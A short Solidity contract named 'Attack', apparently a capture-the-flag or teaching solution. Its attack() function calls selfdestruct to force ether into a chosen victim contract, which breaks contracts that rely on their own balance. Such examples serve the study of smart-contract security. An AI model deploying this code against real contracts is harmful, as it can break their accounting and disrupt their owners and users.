pragma solidity ^0.8.17;

contract Attack {
address immutable victim;
    constructor(address _victim) {
        victim = _victim;
    }

    function attack() public payable {
        address payable addr = payable(victim);
        selfdestruct(addr);
    }
}